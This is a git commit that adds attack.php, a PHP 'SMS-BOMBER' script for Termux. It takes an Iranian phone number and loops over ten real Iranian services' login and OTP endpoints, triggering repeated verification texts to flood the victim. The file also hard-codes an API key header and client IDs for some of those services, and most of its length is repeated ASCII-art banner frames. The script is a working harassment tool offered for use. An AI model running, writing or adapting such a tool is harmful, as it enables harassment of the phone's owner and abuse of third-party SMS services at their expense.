913ff5d8349d9a4d395c2b94507ea8b37d4ed3df
Enixer X <162966914+enixer-x@users.noreply.github.com>
2024-03-11 11:36:43 +0330

    Create attack.php

---
+++ attack.php
@@ -0,0 +1,486 @@
+<?php
+
+// ...
+error_reporting(0);
+
+// ...
+$white = "\e[97m";
+$black = "\e[30m\e[1m";
+$yellow = "\e[93m";
+$orange = "\e[38;5;208m";
+$blue = "\e[34m";
+$lblue = "\e[36m";
+$cln = "\e[0m";
+$green = "\e[92m";
+$fgreen = "\e[32m";
+$red = "\e[91m";
+$magenta = "\e[35m";
+$bluebg = "\e[44m";
+$lbluebg = "\e[106m";
+$greenbg = "\e[42m";
+$lgreenbg = "\e[102m";
+$yellowbg = "\e[43m";
+$lyellowbg = "\e[103m";
+$redbg = "\e[101m";
+$grey = "\e[37m";
+$cyan = "\e[36m";
+$bold = "\e[1m";
+
+// ...
+if($argv[1]=='-h') exit($lblue."To start attacking you need to send this command to Termux:\n\n".$green."[*] :$white php attack.php (+98**********)\n");
+
+// ...
+if(!isset($argv[1])) exit($red."The number parameter is empty.\n\n".$green."[*] :".$white." php attack.php (+98**********)\n");
+if(!preg_match('/^\+989\d{9}$/',$argv[1])) exit($red."The number is not for Iran(+98).\n\n".$green."[*] :".$white." php attack.php (+98**********)\n");
+$number = explode("+98",$argv[1])[1];
+
+// ...
+system("clear");
+echo "$red
+ ⠛⠛⣿⣿⣿⣿⣿⡷⢶⣦⣶⣶⣤⣤⣤⣀⠀⠀⠀
+ ⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⠀
+ ⠀⠀⠀⠉⠉⠉⠙⠻⣿⣿⠿⠿⠛⠛⠛⠻⣿⣿⣇⠀
+ ⠀⠀⢤⣀⣀⣀⠀⠀⢸⣷⡄⠀⣁⣀⣤⣴⣿⣿⣿⣆
+ ⠀⠀⠀⠀⠹⠏⠀⠀⠀⣿⣧⠀⠹⣿⣿⣿⣿⣿⡿⣿
+ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⠿⠇⢀⣼⣿⣿⠛⢯⡿⡟
+ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠦⠴⢿⢿⣿⡿⠷⠀⣿⠀
+ ⠀⠀⠀⠀⠀⠀⠀⠙⣷⣶⣶⣤⣤⣤⣤⣤⣶⣦⠃⠀
+ ⠀⠀⠀⠀⠀⠀⠀⢐⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀
+ ⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀
+ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⢿⣿⣿⣿⣿⠟⠁
+
+$blue#--> T.me/Enixer
+$yellow
+[□□□□□□□□□□] 00%
+";
+system("clear");
+echo "$red
+ ⠛⠛⣿⣿⣿⣿⣿⡷⢶⣦⣶⣶⣤⣤⣤⣀⠀⠀⠀
+ ⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⠀
+ ⠀⠀⠀⠉⠉⠉⠙⠻⣿⣿⠿⠿⠛⠛⠛⠻⣿⣿⣇⠀
+ ⠀⠀⢤⣀⣀⣀⠀⠀⢸⣷⡄⠀⣁⣀⣤⣴⣿⣿⣿⣆
+ ⠀⠀⠀⠀⠹⠏⠀⠀⠀⣿⣧⠀⠹⣿⣿⣿⣿⣿⡿⣿
+ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⠿⠇⢀⣼⣿⣿⠛⢯⡿⡟
+ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠦⠴⢿⢿⣿⡿⠷⠀⣿⠀
+ ⠀⠀⠀⠀⠀⠀⠀⠙⣷⣶⣶⣤⣤⣤⣤⣤⣶⣦⠃⠀
+ ⠀⠀⠀⠀⠀⠀⠀⢐⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀
+ ⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀
+ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⢿⣿⣿⣿⣿⠟⠁
+
+$blue#--> T.me/Enixer
+$yellow
+[■□□□□□□□□□] 10%
+";
+system("clear");
+echo "$red
+ ⠛⠛⣿⣿⣿⣿⣿⡷⢶⣦⣶⣶⣤⣤⣤⣀⠀⠀⠀
+ ⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⠀
+ ⠀⠀⠀⠉⠉⠉⠙⠻⣿⣿⠿⠿⠛⠛⠛⠻⣿⣿⣇⠀
+ ⠀⠀⢤⣀⣀⣀⠀⠀⢸⣷⡄⠀⣁⣀⣤⣴⣿⣿⣿⣆
+ ⠀⠀⠀⠀⠹⠏⠀⠀⠀⣿⣧⠀⠹⣿⣿⣿⣿⣿⡿⣿
+ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⠿⠇⢀⣼⣿⣿⠛⢯⡿⡟
+ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠦⠴⢿⢿⣿⡿⠷⠀⣿⠀
+ ⠀⠀⠀⠀⠀⠀⠀⠙⣷⣶⣶⣤⣤⣤⣤⣤⣶⣦⠃⠀
+ ⠀⠀⠀⠀⠀⠀⠀⢐⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀
+ ⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀
+ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⢿⣿⣿⣿⣿⠟⠁
+
+$blue#--> T.me/Enixer
+$yellow
+[■■□□□□□□□□] 20%
+";
+system("clear");
+echo "$red
+ ⠛⠛⣿⣿⣿⣿⣿⡷⢶⣦⣶⣶⣤⣤⣤⣀⠀⠀⠀
+ ⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⠀
+ ⠀⠀⠀⠉⠉⠉⠙⠻⣿⣿⠿⠿⠛⠛⠛⠻⣿⣿⣇⠀
+ ⠀⠀⢤⣀⣀⣀⠀⠀⢸⣷⡄⠀⣁⣀⣤⣴⣿⣿⣿⣆
+ ⠀⠀⠀⠀⠹⠏⠀⠀⠀⣿⣧⠀⠹⣿⣿⣿⣿⣿⡿⣿
+ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⠿⠇⢀⣼⣿⣿⠛⢯⡿⡟
+ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠦⠴⢿⢿⣿⡿⠷⠀⣿⠀
+ ⠀⠀⠀⠀⠀⠀⠀⠙⣷⣶⣶⣤⣤⣤⣤⣤⣶⣦⠃⠀
+ ⠀⠀⠀⠀⠀⠀⠀⢐⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀
+ ⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀
+ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⢿⣿⣿⣿⣿⠟⠁
+
+$blue#--> T.me/Enixer
+$yellow
+[■■■□□□□□□□] 30%
+";
+system("clear");
+echo "$red
+ ⠛⠛⣿⣿⣿⣿⣿⡷⢶⣦⣶⣶⣤⣤⣤⣀⠀⠀⠀
+ ⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⠀
+ ⠀⠀⠀⠉⠉⠉⠙⠻⣿⣿⠿⠿⠛⠛⠛⠻⣿⣿⣇⠀
+ ⠀⠀⢤⣀⣀⣀⠀⠀⢸⣷⡄⠀⣁⣀⣤⣴⣿⣿⣿⣆
+ ⠀⠀⠀⠀⠹⠏⠀⠀⠀⣿⣧⠀⠹⣿⣿⣿⣿⣿⡿⣿
+ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⠿⠇⢀⣼⣿⣿⠛⢯⡿⡟
+ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠦⠴⢿⢿⣿⡿⠷⠀⣿⠀
+ ⠀⠀⠀⠀⠀⠀⠀⠙⣷⣶⣶⣤⣤⣤⣤⣤⣶⣦⠃⠀
+ ⠀⠀⠀⠀⠀⠀⠀⢐⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀
+ ⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀
+ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⢿⣿⣿⣿⣿⠟⠁
+
+$blue#--> T.me/Enixer
+$yellow
+[■■■■□□□□□□] 40%
+";
+system("clear");
+echo "$red
+ ⠛⠛⣿⣿⣿⣿⣿⡷⢶⣦⣶⣶⣤⣤⣤⣀⠀⠀⠀
+ ⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⠀
+ ⠀⠀⠀⠉⠉⠉⠙⠻⣿⣿⠿⠿⠛⠛⠛⠻⣿⣿⣇⠀
+ ⠀⠀⢤⣀⣀⣀⠀⠀⢸⣷⡄⠀⣁⣀⣤⣴⣿⣿⣿⣆
+ ⠀⠀⠀⠀⠹⠏⠀⠀⠀⣿⣧⠀⠹⣿⣿⣿⣿⣿⡿⣿
+ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⠿⠇⢀⣼⣿⣿⠛⢯⡿⡟
+ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠦⠴⢿⢿⣿⡿⠷⠀⣿⠀
+ ⠀⠀⠀⠀⠀⠀⠀⠙⣷⣶⣶⣤⣤⣤⣤⣤⣶⣦⠃⠀
+ ⠀⠀⠀⠀⠀⠀⠀⢐⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀
+ ⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀
+ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⢿⣿⣿⣿⣿⠟⠁
+
+$blue#--> T.me/Enixer
+$yellow
+[■■■■■□□□□□] 50%
+";
+system("clear");
+echo "$red
+ ⠛⠛⣿⣿⣿⣿⣿⡷⢶⣦⣶⣶⣤⣤⣤⣀⠀⠀⠀
+ ⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⠀
+ ⠀⠀⠀⠉⠉⠉⠙⠻⣿⣿⠿⠿⠛⠛⠛⠻⣿⣿⣇⠀
+ ⠀⠀⢤⣀⣀⣀⠀⠀⢸⣷⡄⠀⣁⣀⣤⣴⣿⣿⣿⣆
+ ⠀⠀⠀⠀⠹⠏⠀⠀⠀⣿⣧⠀⠹⣿⣿⣿⣿⣿⡿⣿
+ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⠿⠇⢀⣼⣿⣿⠛⢯⡿⡟
+ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠦⠴⢿⢿⣿⡿⠷⠀⣿⠀
+ ⠀⠀⠀⠀⠀⠀⠀⠙⣷⣶⣶⣤⣤⣤⣤⣤⣶⣦⠃⠀
+ ⠀⠀⠀⠀⠀⠀⠀⢐⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀
+ ⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀
+ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⢿⣿⣿⣿⣿⠟⠁
+
+$blue#--> T.me/Enixer
+$yellow
+[■■■■■■□□□□] 60%
+";
+system("clear");
+echo "$red
+ ⠛⠛⣿⣿⣿⣿⣿⡷⢶⣦⣶⣶⣤⣤⣤⣀⠀⠀⠀
+ ⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⠀
+ ⠀⠀⠀⠉⠉⠉⠙⠻⣿⣿⠿⠿⠛⠛⠛⠻⣿⣿⣇⠀
+ ⠀⠀⢤⣀⣀⣀⠀⠀⢸⣷⡄⠀⣁⣀⣤⣴⣿⣿⣿⣆
+ ⠀⠀⠀⠀⠹⠏⠀⠀⠀⣿⣧⠀⠹⣿⣿⣿⣿⣿⡿⣿
+ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⠿⠇⢀⣼⣿⣿⠛⢯⡿⡟
+ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠦⠴⢿⢿⣿⡿⠷⠀⣿⠀
+ ⠀⠀⠀⠀⠀⠀⠀⠙⣷⣶⣶⣤⣤⣤⣤⣤⣶⣦⠃⠀
+ ⠀⠀⠀⠀⠀⠀⠀⢐⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀
+ ⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀
+ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⢿⣿⣿⣿⣿⠟⠁
+
+$blue#--> T.me/Enixer
+$yellow
+[■■■■■■■□□□] 70%
+";
+system("clear");
+echo "$red
+ ⠛⠛⣿⣿⣿⣿⣿⡷⢶⣦⣶⣶⣤⣤⣤⣀⠀⠀⠀
+ ⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⠀
+ ⠀⠀⠀⠉⠉⠉⠙⠻⣿⣿⠿⠿⠛⠛⠛⠻⣿⣿⣇⠀
+ ⠀⠀⢤⣀⣀⣀⠀⠀⢸⣷⡄⠀⣁⣀⣤⣴⣿⣿⣿⣆
+ ⠀⠀⠀⠀⠹⠏⠀⠀⠀⣿⣧⠀⠹⣿⣿⣿⣿⣿⡿⣿
+ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⠿⠇⢀⣼⣿⣿⠛⢯⡿⡟
+ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠦⠴⢿⢿⣿⡿⠷⠀⣿⠀
+ ⠀⠀⠀⠀⠀⠀⠀⠙⣷⣶⣶⣤⣤⣤⣤⣤⣶⣦⠃⠀
+ ⠀⠀⠀⠀⠀⠀⠀⢐⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀
+ ⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀
+ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⢿⣿⣿⣿⣿⠟⠁
+
+$blue#--> T.me/Enixer
+$yellow
+[■■■■■■■■□□] 80%
+";
+system("clear");
+echo "$red
+ ⠛⠛⣿⣿⣿⣿⣿⡷⢶⣦⣶⣶⣤⣤⣤⣀⠀⠀⠀
+ ⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⠀
+ ⠀⠀⠀⠉⠉⠉⠙⠻⣿⣿⠿⠿⠛⠛⠛⠻⣿⣿⣇⠀
+ ⠀⠀⢤⣀⣀⣀⠀⠀⢸⣷⡄⠀⣁⣀⣤⣴⣿⣿⣿⣆
+ ⠀⠀⠀⠀⠹⠏⠀⠀⠀⣿⣧⠀⠹⣿⣿⣿⣿⣿⡿⣿
+ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⠿⠇⢀⣼⣿⣿⠛⢯⡿⡟
+ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠦⠴⢿⢿⣿⡿⠷⠀⣿⠀
+ ⠀⠀⠀⠀⠀⠀⠀⠙⣷⣶⣶⣤⣤⣤⣤⣤⣶⣦⠃⠀
+ ⠀⠀⠀⠀⠀⠀⠀⢐⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀
+ ⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀
+ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⢿⣿⣿⣿⣿⠟⠁
+
+$blue#--> T.me/Enixer
+$yellow
+[■■■■■■■■■□] 90%
+";
+system("clear");
+echo "$red
+ ⠛⠛⣿⣿⣿⣿⣿⡷⢶⣦⣶⣶⣤⣤⣤⣀⠀⠀⠀
+ ⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⠀
+ ⠀⠀⠀⠉⠉⠉⠙⠻⣿⣿⠿⠿⠛⠛⠛⠻⣿⣿⣇⠀
+ ⠀⠀⢤⣀⣀⣀⠀⠀⢸⣷⡄⠀⣁⣀⣤⣴⣿⣿⣿⣆
+ ⠀⠀⠀⠀⠹⠏⠀⠀⠀⣿⣧⠀⠹⣿⣿⣿⣿⣿⡿⣿
+ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⠿⠇⢀⣼⣿⣿⠛⢯⡿⡟
+ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠦⠴⢿⢿⣿⡿⠷⠀⣿⠀
+ ⠀⠀⠀⠀⠀⠀⠀⠙⣷⣶⣶⣤⣤⣤⣤⣤⣶⣦⠃⠀
+ ⠀⠀⠀⠀⠀⠀⠀⢐⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀
+ ⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀
+ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⢿⣿⣿⣿⣿⠟⠁
+
+$blue#--> T.me/Enixer
+$green
+[■■■■■■■■■■] 100%
+";
+system("clear");
+echo "$red
+ ⠛⠛⣿⣿⣿⣿⣿⡷⢶⣦⣶⣶⣤⣤⣤⣀⠀⠀⠀
+ ⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⠀
+ ⠀⠀⠀⠉⠉⠉⠙⠻⣿⣿⠿⠿⠛⠛⠛⠻⣿⣿⣇⠀
+ ⠀⠀⢤⣀⣀⣀⠀⠀⢸⣷⡄⠀⣁⣀⣤⣴⣿⣿⣿⣆
+ ⠀⠀⠀⠀⠹⠏⠀⠀⠀⣿⣧⠀⠹⣿⣿⣿⣿⣿⡿⣿
+ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⠿⠇⢀⣼⣿⣿⠛⢯⡿⡟
+ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠦⠴⢿⢿⣿⡿⠷⠀⣿⠀
+ ⠀⠀⠀⠀⠀⠀⠀⠙⣷⣶⣶⣤⣤⣤⣤⣤⣶⣦⠃⠀
+ ⠀⠀⠀⠀⠀⠀⠀⢐⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀
+ ⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀
+ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⢿⣿⣿⣿⣿⠟⠁
+
+$blue#--> T.me/Enixer
+$green
+[■■■■■■■■■■] 100%
+$yellow
+Attacking...\n\n
+$green";
+
+// ...
+function api1($number){
+    $url = "https://arzinja.app/api/login?";
+    $data = [
+        'mobile' => "0$number"
+    ];
+    $ch = curl_init();
+    curl_setopt($ch , CURLOPT_URL , $url);
+    curl_setopt($ch , CURLOPT_RETURNTRANSFER , true);
+    curl_setopt($ch , CURLOPT_POSTFIELDS ,$data);
+    $res = curl_exec($ch);
+    if (curl_error($ch)){
+        var_dump(curl_error($ch));
+    }else{
+        var_dump($res) ;
+    }
+}
+
+function api2($number){
+    $url = "https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone=0$number";
+    $data = [
+        'cellphone' => "0$number"
+    ];
+    $ch = curl_init();
+    curl_setopt($ch , CURLOPT_URL , $url);
+    curl_setopt($ch , CURLOPT_RETURNTRANSFER , true);
+    curl_setopt($ch , CURLOPT_POSTFIELDS ,$data);
+    $res = curl_exec($ch);
+    if (curl_error($ch)){
+        var_dump(curl_error($ch));
+    }else{
+        var_dump($res) ;
+    }
+}
+
+function api3($number){
+    $url = "https://takshopaccessorise.ir/api/v1/sessions/login_request";
+    $data = '{
+        "mobile_phone": "0'.$number.'"
+    }';
+    $ch = curl_init();
+    curl_setopt($ch , CURLOPT_URL , $url);
+    curl_setopt($ch , CURLOPT_RETURNTRANSFER , true);
+    curl_setopt($ch , CURLOPT_POSTFIELDS ,$data);
+    $res = curl_exec($ch);
+    if (curl_error($ch)){
+        var_dump(curl_error($ch));
+    }else{
+        var_dump($res) ;
+    }
+}
+
+function api4($number){
+    $url = "https://api.bitpin.ir/v2/usr/signin/";
+    $data = [
+        "phone"=> "0$number"
+    ];
+    $ch = curl_init();
+    curl_setopt($ch , CURLOPT_URL , $url);
+    curl_setopt($ch , CURLOPT_RETURNTRANSFER , true);
+    curl_setopt($ch , CURLOPT_POSTFIELDS ,$data);
+    $res = curl_exec($ch);
+    if (curl_error($ch)){
+        var_dump(curl_error($ch));
+    }else{
+        var_dump($res) ;
+    }
+}
+
+function api5($number){
+    $url = "https://www.aparat.com/api/fa/v1/user/Authenticate/country_code?callbackType=postmessage";
+    $data = [
+        "mobile"=> "0$number",
+        "guid"=> "D0FE735D-792A-8BE5-6ED4-E8F0DC882EF9"
+    ];
+    $ch = curl_init();
+    curl_setopt($ch , CURLOPT_URL , $url);
+    curl_setopt($ch , CURLOPT_RETURNTRANSFER , true);
+    curl_setopt($ch , CURLOPT_POSTFIELDS ,$data);
+    $res = curl_exec($ch);
+    if (curl_error($ch)){
+        var_dump(curl_error($ch));
+    }else{
+        var_dump($res) ;
+    }
+}
+
+function api6($number){
+    $url = "https://api.digikala.com/v1/user/authenticate/";
+    $data = [
+        "backUrl"=>"/",
+        "username"=>"0$number",
+        "otp_call"=>false
+    ];
+    $ch = curl_init();
+    curl_setopt($ch , CURLOPT_URL , $url);
+    curl_setopt($ch , CURLOPT_RETURNTRANSFER , true);
+    curl_setopt($ch , CURLOPT_POSTFIELDS ,$data);
+    $res = curl_exec($ch);
+    if (curl_error($ch)){
+        var_dump(curl_error($ch));
+    }else{
+        var_dump($res) ;
+    }
+}
+
+function api7($number){
+    $url = "https://bck.behtarino.com/api/v1/users/phone_verification/";
+    $data = [
+        "phone"=>"0$number"
+    ];
+    $ch = curl_init();
+    curl_setopt($ch , CURLOPT_URL , $url);
+    curl_setopt($ch , CURLOPT_RETURNTRANSFER , true);
+    curl_setopt($ch , CURLOPT_POSTFIELDS ,$data);
+    $res = curl_exec($ch);
+    if (curl_error($ch)){
+        var_dump(curl_error($ch));
+    }else{
+        var_dump($res) ;
+    }
+}
+
+function api8($number){
+    $url = "https://nobat.ir/api/public/patient/login/phone";
+    $data = [
+        "mobile"=> "$number",
+        "use_emta_v2"=> "yes",
+        "domain"=> "nobat"
+    ];
+    $ch = curl_init();
+    curl_setopt($ch , CURLOPT_URL , $url);
+    curl_setopt($ch , CURLOPT_RETURNTRANSFER , true);
+    curl_setopt($ch , CURLOPT_POSTFIELDS ,$data);
+    $res = curl_exec($ch);
+    if (curl_error($ch)){
+        var_dump(curl_error($ch));
+    }else{
+        var_dump($res) ;
+    }
+}
+
+function api9($number){
+    $url = "https://drnobat.ir/webservice/customers/register";
+    $data = [
+        "mobile"=> "0$number"
+    ];
+    $ch = curl_init();
+    curl_setopt($ch , CURLOPT_URL , $url);
+    curl_setopt($ch , CURLOPT_RETURNTRANSFER , true);
+    curl_setopt($ch , CURLOPT_POSTFIELDS ,$data);
+    curl_setopt($ch,CURLOPT_HTTPHEADER,array (
+        'Key: _Dro1pl$XzpO3tY78uSopd2Bn%szoaD73V0J3$1Av@yQh'
+     )); 
+    $res = curl_exec($ch);
+    if (curl_error($ch)){
+        var_dump(curl_error($ch));
+    }else{
+         var_dump($res) ;
+        var_dump($res);
+    }
+}
+
+function api10($number){
+    $url = "https://api.cafebazaar.ir/rest-v1/process/GetOtpTokenRequest";
+    $data = json_encode([
+        "properties"=> [
+            "language"=> 2,
+            "clientID"=> "7yk3txkadwu0db0gwlfx5c63ne76mc6n",
+            "deviceID"=> "7yk3txkadwu0db0gwlfx5c63ne76mc6n",
+            "clientVersion"=> "web"
+        ],
+        "singleRequest"=> [
+            "getOtpTokenRequest"=> [
+                "username"=> "98$number"
+            ]
+        ]
+    ]);
+    $ch = curl_init();
+    curl_setopt($ch , CURLOPT_URL , $url);
+    curl_setopt($ch , CURLOPT_RETURNTRANSFER , true);
+    curl_setopt($ch , CURLOPT_POSTFIELDS ,$data);
+    $res = curl_exec($ch);
+    if (curl_error($ch)){
+        var_dump(curl_error($ch));
+    }else{
+         var_dump($res) ;
+        var_dump($res);
+    }
+}
+
+// ...
+function wdone($name){
+	$green = "\e[32m";
+	echo $green."« $name sent successfully. »\n\n";
+}
+
+// ...
+$count = $argv[2] ? $argv[2] : 10;
+for($n=0;$n<$count;$n++){
+	api1($number);
+	wdone("Arzinja");
+	api2($number);
+	wdone("Snapp");
+	api3($number);
+	wdone("Takshop");
+	api4($number);
+	wdone("Bitpin");
+	api5($number);
+	wdone("Aparat");
+	api6($number);
+	wdone("Digikala");
+	api7($number);
+	wdone("Behtarino");
+	api8($number);
+	wdone("Nobat");
+	api9($number);
+	wdone("Drnobat");
+	api10($number);
+	wdone("Cafebazaar");
+}
+
+// ...
+echo "$blue
+#--> T.me/Enixer - SMS-BOMBER
+$yellow
+Done...!
+";
+
+?>
